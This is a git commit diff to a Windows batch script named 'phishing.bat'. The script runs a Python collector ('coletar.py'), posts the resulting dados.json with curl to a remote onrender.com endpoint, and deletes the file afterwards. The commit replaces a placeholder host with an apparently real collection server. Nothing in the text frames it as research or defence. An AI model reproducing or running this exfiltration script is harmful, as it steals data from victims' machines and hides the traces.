5f224a2aa50f1db6dd037deb5a532d4a133e87a2
Huss873 <davidaltuniverse@gmail.com>
2026-08-15 18:35:10 -0300

    Update phishing.bat

--- phishing.bat
+++ phishing.bat
@@ -5,7 +5,7 @@ REM Coleta informações
 python coletar.py > dados.json
 
 REM Envia para servidor
-curl -X POST -H "Content-Type: application/json" -d @dados.json https://seunome.onrender.com/receber
+curl -X POST -H "Content-Type: application/json" -d @dados.json https://huss-w2h3.onrender.com/receber
 
 REM Limpa
 del dados.json >nul 2>&1
